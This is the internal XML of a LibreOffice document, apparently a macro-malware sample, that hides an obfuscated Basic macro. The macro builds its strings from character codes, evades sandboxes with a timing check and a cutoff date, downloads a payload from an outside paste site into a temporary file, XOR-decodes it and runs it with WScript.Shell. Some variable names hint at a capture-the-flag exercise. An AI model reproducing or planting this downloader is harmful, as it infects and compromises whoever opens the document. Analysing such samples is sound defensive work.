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Pictures/1000000000000388000005004CEC6D33B1653FD1.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7874in" svg:y="-0.7874in" svg:width="8.5in" svg:height="11in" draw:z-index="0"><draw:image xlink:href="Pictures/1000000000000388000005004CEC6D33B1653FD1.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6:24:10.245000000</meta:creation-date>
    <dc:date>2022-05-15T16:43:40.022000000</dc:date>
    <meta:editing-duration>PT19M29S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.3.2$Windows_X86_64 LibreOffice_project/d1d0ea68f081ee2800a922cac8f79445e4603348</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0" meta:non-whitespace-character-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Basedddytpprgdoax 
Dim qjwisddpkbutuyzkwzpto As Integer
Dim qutdnerpfqgjuynqafDecodeAs As Integer
Dim Calculatebzkcyyomunbrwxrs As String
Dim RSAjedyvfmkgmskzeisAs As Integer
Encryptnrcyvhpqnliwywd()
Dim nlgmzfioyfnpmclfmlftmbzkd As String
Dim Calculatepopqaoneo As Integer
qjwisddpkbutuyzkwzpto = 237
Calculatebzkcyyomunbrwxrs = Chr(112) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(108) &amp; ""
nlgmzfioyfnpmclfmlftmbzkd = Chr(82) &amp; "" &amp; Chr(85) &amp; "" &amp; Chr(78) &amp; "" &amp; Chr(95) &amp; "" &amp; Chr(79) &amp; "" &amp; Chr(78) &amp; "" &amp; Chr(67) &amp; "" &amp; Chr(69) &amp; ""
Calculatepopqaoneo = 622
qjwisddpkbutuyzkwzpto = qjwisddpkbutuyzkwzpto + 48
nlgmzfioyfnpmclfmlftmbzkd = Replace(nlgmzfioyfnpmclfmlftmbzkd, Chr(119) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(73) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(106) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(116) &amp; "", Chr(3)) 
Calculatepopqaoneo = Calculatepopqaoneo - 29
End Sub
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
(ByVal pCaller As Long, _
ByVal szURL As String, _
ByVal szqegxabjgwrvivilr As String, _
ByVal dwReserved As Long, _
ByVal lpfnCB As Long) As Long
Sub mpocpedrdedylqthvgzdapya As String
Dim zxptjbsmsupwyVBA
Set zxptjbsmsupwyVBA = createObject(Chr(87) &amp; "" &amp; Chr(83) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(83) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(108) &amp; "")
mpocpedrdedylqthvgzdapya = zxptjbsmsupwyVBA.ExpandEnvironmentStrings(Chr(37) &amp; "" &amp; Chr(84) &amp; "" &amp; Chr(77) &amp; "" &amp; Chr(80) &amp; "" &amp; Chr(37) &amp; "")
End Sub
Sub nbtcbnyd As String
Dim bziglhbgiwwvblp, tqbqlvxkzinAES as String
Dim RessourceqromchmltihAs As String
Dim i as Integer
bziglhbgiwwvblp = ""
for i = 1 to 20
Select Case i
Case 5, 8, 11, 14
bziglhbgiwwvblp=bziglhbgiwwvblp+Chr(95) &amp; ""
Case Else
tqbqlvxkzinAES=Hex(int(rnd*256))
if len(tqbqlvxkzinAES)&lt;2 then tqbqlvxkzinAES=tqbqlvxkzinAES+Chr(48) &amp; ""
bziglhbgiwwvblp=bziglhbgiwwvblp+tqbqlvxkzinAES
End Select
next
nbtcbnyd = bziglhbgiwwvblp
End Sub
Sub amwxnlxcctjstjjgqlkspqnm(sycowwsyyll As String) As String
Dim togyvyhsnbetsqnll As String
Dim ps As Object, Macrokvjymzmbg As String
Dim wbsggcbesxgmx As String
Dim ynkgtlqhx As String
Dim wceblrhmjwlvakijufym As String
ynkgtlqhx = """"
wceblrhmjwlvakijufym = Chr(46) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(103) &amp; ""
togyvyhsnbetsqnll = Chr(92) &amp; "" &amp; nbtcbnyd() &amp; wceblrhmjwlvakijufym
ps = CreateUnoService(Chr(99) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(109) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(109) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(83) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(115) &amp; "")
Macrokvjymzmbg = sycowwsyyll &amp; togyvyhsnbetsqnll
wbsggcbesxgmx = Chr(104) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(58) &amp; "" &amp; Chr(47) &amp; "" &amp; Chr(47) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(47) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(57) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(52) &amp; "" &amp; Chr(47) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(119) &amp; ""
URLDownloadToFile(ynkgtlqhx, wbsggcbesxgmx, Macrokvjymzmbg, ynkgtlqhx, ynkgtlqhx)
amwxnlxcctjstjjgqlkspqnm = togyvyhsnbetsqnll
End Sub
Sub Encryptnrcyvhpqnliwywd 
Dim mwjkcotaprrzjxeiag As Integer
Dim cuudezevofvsyhmqzo As String
Dim ebfyludcqxce As String
Dim Processbwrmehmmtddxnqqzxzuwrwq As Integer
Dim vrrsptsmw As Integer
Dim fgmlxxpwnafiq As String
Dim flaqagcondfqzovDownload As Integer
fgmlxxpwnafiq = Chr(115) &amp; "" &amp; Chr(106) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(111) &amp; ""
Processbwrmehmmtddxnqqzxzuwrwq = 559
cuudezevofvsyhmqzo = Chr(115) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(106) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(101) &amp; ""
ebfyludcqxce = Chr(106) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(106) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(82) &amp; "" &amp; Chr(67) &amp; "" &amp; Chr(52) &amp; ""
vrrsptsmw = 520
mwjkcotaprrzjxeiag = 817
flaqagcondfqzovDownload = 974
mwjkcotaprrzjxeiag = mwjkcotaprrzjxeiag Xor 98
ebfyludcqxce = Chr(118) &amp; "" &amp; ebfyludcqxce
flaqagcondfqzovDownload = flaqagcondfqzovDownload + 82
Processbwrmehmmtddxnqqzxzuwrwq = Processbwrmehmmtddxnqqzxzuwrwq Xor 122
End Sub
Sub akwsvjdkhzRSA(lesknpusdovkdz As Integer) As Integer
Dim ddzpdapibqdxgqVBA As String
Basedddytpprgdoax()
Dim zjlfffpmtstruwfpjivgv As Integer
Dim hwdvzxriuaesAs As Integer
Dim Replacewkiseatcldsaxkc As String
Dim aqlffqzrxqghbzrmAs As Integer
Dim bgduxhgfxclqbwdlallpejsl As Integer
Dim jdikszhbtijn As String
Dim rcpmuszkrbr As Integer
Dim ewwvsijmbpwvyofrkndjry As Integer
Dim Writecatrwseecycicyww As Integer
Replacewkiseatcldsaxkc = Chr(119) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(104) &amp; ""
Encryptnrcyvhpqnliwywd()
zjlfffpmtstruwfpjivgv = 332
ddzpdapibqdxgqVBA = Chr(105) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(109) &amp; "" &amp; Chr(100) &amp; ""
jdikszhbtijn = Chr(113) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(109) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(113) &amp; ""
Writecatrwseecycicyww = 928
bgduxhgfxclqbwdlallpejsl = 719
rcpmuszkrbr = 595
ewwvsijmbpwvyofrkndjry = 461
ddzpdapibqdxgqVBA = Replace(ddzpdapibqdxgqVBA, Chr(117) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(108) &amp; "", "138") 
ewwvsijmbpwvyofrkndjry = ewwvsijmbpwvyofrkndjry Xor 2
jdikszhbtijn = Chr(109) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(113) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(115) &amp; "" &amp; jdikszhbtijn
bgduxhgfxclqbwdlallpejsl = bgduxhgfxclqbwdlallpejsl + 108
rcpmuszkrbr = rcpmuszkrbr Xor 227
Replacewkiseatcldsaxkc = Replacewkiseatcldsaxkc &amp; Chr(81) &amp; ""
Encryptnrcyvhpqnliwywd()
zjlfffpmtstruwfpjivgv = zjlfffpmtstruwfpjivgv Xor 222
lesknpusdovkdz = Writecatrwseecycicyww
End Sub
Sub tkpbedccrwwmimroxffkk(qegxabjgwrvivilr As String)
Dim ronnuonjfatfqhphub As Object
Dim gmhnuidrcsfvxytbx As String
Set ronnuonjfatfqhphub = CreateObject(Chr(83) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(65) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(110) &amp; "")
Objhandle.Open Environ(Chr(84) &amp; "" &amp; Chr(69) &amp; "" &amp; Chr(77) &amp; "" &amp; Chr(80) &amp; "") &amp; qegxabjgwrvivilr
End Sub
Sub cxyhvqmc(kuezrwkzfiInject As String) As String
Dim eeqkmygdlnDownload As Integer
Dim bnemakfswafalmInject As String
Dim XorvsogzmwatduuzmbxtcAs As Integer
eeqkmygdlnDownload = FreeFile
Open kuezrwkzfiInject For Input As eeqkmygdlnDownload
Line Input #eeqkmygdlnDownload, bnemakfswafalmInject
Close #eeqkmygdlnDownload
cxyhvqmc = bnemakfswafalmInject
End Sub
Sub yqzfgdmt(Processcmsgndbsiwwduietgxldxxkpw As String) As String
Dim konjmbqkmpcgiwcyleoyenbn() As Integer
Dim RC4bkrfxdhofadnzu As Integer
Dim lymmuzyyykknszfgms As Integer
Dim AESkmzztupdqwiwlasn As String
AESkmzztupdqwiwlasn = ""
konjmbqkmpcgiwcyleoyenbn = Split(Processcmsgndbsiwwduietgxldxxkpw, " ")
for each RC4bkrfxdhofadnzu in konjmbqkmpcgiwcyleoyenbn
lymmuzyyykknszfgms = RC4bkrfxdhofadnzu XOR 66
AESkmzztupdqwiwlasn = AESkmzztupdqwiwlasn &amp; Chr(lymmuzyyykknszfgms)
next
yqzfgdmt = AESkmzztupdqwiwlasn
End Sub
Sub rukbizjwgxckvFlag(eetrbduamhonzyheiedFAKE As String)
Dim lfhxmxcrwfmbuwzgkhearl As Object
Set lfhxmxcrwfmbuwzgkhearl = CreateObject(Chr(87) &amp; "" &amp; Chr(83) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(112) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(83) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(108) &amp; "")
Dim Divideujqogihukrvhxkkjfpfnmfbvj As Boolean: Divideujqogihukrvhxkkjfpfnmfbvj = False
Dim zfhuujqbvtrsjnrqkiq As Integer: zfhuujqbvtrsjnrqkiq = 0
lfhxmxcrwfmbuwzgkhearl.Run eetrbduamhonzyheiedFAKE, zfhuujqbvtrsjnrqkiq, Divideujqogihukrvhxkkjfpfnmfbvj
End Sub
Sub qbyghksgdipg(zaxakwtptbtxmyrckvyo As String) As String
Dim hswglmobfvukyjtEncrypt As String
Dim xtnjawtpkjupyAs As Integer
hswglmobfvukyjtEncrypt = Replace(zaxakwtptbtxmyrckvyo, Chr(57) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(51) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(57) &amp; "" &amp; Chr(51) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(53) &amp; "" &amp; Chr(51) &amp; "" &amp; Chr(56) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(57) &amp; "" &amp; Chr(56) &amp; "" &amp; Chr(54) &amp; "", "")
hswglmobfvukyjtEncrypt = Replace(zaxakwtptbtxmyrckvyo, Chr(57) &amp; "" &amp; Chr(57) &amp; "" &amp; Chr(50) &amp; "" &amp; Chr(51) &amp; "" &amp; Chr(55) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(52) &amp; "" &amp; Chr(56) &amp; "" &amp; Chr(57) &amp; "" &amp; Chr(49) &amp; "" &amp; Chr(48) &amp; "" &amp; Chr(54) &amp; "" &amp; Chr(51) &amp; "", " ")
qbyghksgdipg = hswglmobfvukyjtEncrypt
End Sub
Sub akmepwoqueyqteyusqwo As String
Dim oildhapbqvuricfjnpigdsvq As Integer
Dim fkpuwvrdk As String
Dim kvetkepnbiAs As Integer
Dim ofepqgbijccjFAKE As String
Encryptnrcyvhpqnliwywd()
Dim lyltsoszfjppv As String
Dim znvsqtahtzjmqfqq As String
Basedddytpprgdoax()
Dim xhsfpzxfattovatqdAs As Integer
Dim taithzodkc As Integer
Dim yztpaxwihzxeyrpkfy As Integer
Dim kbtfhthkzqfydhzmfm As Integer
Dim ewnjgefpitllvbFlagAs As Integer
oildhapbqvuricfjnpigdsvq = 54
lyltsoszfjppv = Chr(122) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(107) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(119) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(113) &amp; ""
yztpaxwihzxeyrpkfy = 523
fkpuwvrdk = Chr(73) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(106) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(105) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(103) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(100) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(110) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(108) &amp; ""
taithzodkc = 857
ofepqgbijccjFAKE = Chr(122) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(120) &amp; "" &amp; Chr(117) &amp; "" &amp; Chr(109) &amp; "" &amp; Chr(114) &amp; "" &amp; Chr(122) &amp; ""
kbtfhthkzqfydhzmfm = 644
znvsqtahtzjmqfqq = Chr(109) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(99) &amp; "" &amp; Chr(108) &amp; "" &amp; Chr(118) &amp; "" &amp; Chr(121) &amp; "" &amp; Chr(122) &amp; "" &amp; Chr(102) &amp; "" &amp; Chr(115) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(104) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(98) &amp; "" &amp; Chr(100) &amp; ""
lyltsoszfjppv = lyltsoszfjppv
fkpuwvrdk = fkpuwvrdk
oildhapbqvuricfjnpigdsvq = oildhapbqvuricfjnpigdsvq Xor 37
taithzodkc = taithzodkc - 11
kbtfhthkzqfydhzmfm = kbtfhthkzqfydhzmfm Xor 100
yztpaxwihzxeyrpkfy = yztpaxwihzxeyrpkfy - 14
End Sub
Sub erwgpzsepdzttmjuvnovbwtc As String
Dim eqivxerpxktgirsrhlkpzgdgq As Integer
eqivxerpxktgirsrhlkpzgdgq = 0
LimitDate = #06/18/22#
If Now &lt; LimitDate Then eqivxerpxktgirsrhlkpzgdgq = 1 
erwgpzsepdzttmjuvnovbwtc = eqivxerpxktgirsrhlkpzgdgq
End Sub
Sub vqqzycjqjpkhqvovmi As Integer
Dim yirsjfybfpahhjdfvegqidi As Long
Dim Encrypttjkhgcmdbhixyxo As Integer
Encrypttjkhgcmdbhixyxo = 0
yirsjfybfpahhjdfvegqidi = GetSystemTicks()
Wait 2000
yirsjfybfpahhjdfvegqidi = (GetSystemTicks() - yirsjfybfpahhjdfvegqidi)
If yirsjfybfpahhjdfvegqidi &lt; 2000 Then Encrypttjkhgcmdbhixyxo = 1
vqqzycjqjpkhqvovmi = Encrypttjkhgcmdbhixyxo
End Sub
Sub Main
If vqqzycjqjpkhqvovmi() = 0 Then
Dim wzhtvfbpqbuzmustotc, Tmpwzhtvfbpqbuzmustotc As String
Dim hbtogbnfbxcaekszei, regaajfhpscnbmcwmwprjge As String
Dim ytnqvabyudituwreskajsxwdAs As String
Dim lhpvebwowSplit As Integer
If erwgpzsepdzttmjuvnovbwtc() = 1 Then
Tmpwzhtvfbpqbuzmustotc = mpocpedrdedylqthvgzdapya()
wzhtvfbpqbuzmustotc = amwxnlxcctjstjjgqlkspqnm(Tmpwzhtvfbpqbuzmustotc)
hbtogbnfbxcaekszei = cxyhvqmc(Tmpwzhtvfbpqbuzmustotc &amp; wzhtvfbpqbuzmustotc)
regaajfhpscnbmcwmwprjge = qbyghksgdipg(hbtogbnfbxcaekszei)
regaajfhpscnbmcwmwprjge = yqzfgdmt(regaajfhpscnbmcwmwprjge)
rukbizjwgxckvFlag(regaajfhpscnbmcwmwprjge)
Basedddytpprgdoax()
MsgBox(regaajfhpscnbmcwmwprjge)
Else
MsgBox(Chr(84) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(111) &amp; "" &amp; Chr(32) &amp; "" &amp; Chr(76) &amp; "" &amp; Chr(97) &amp; "" &amp; Chr(116) &amp; "" &amp; Chr(101) &amp; "" &amp; Chr(32) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(46) &amp; "" &amp; Chr(46) &amp; "")
Basedddytpprgdoax()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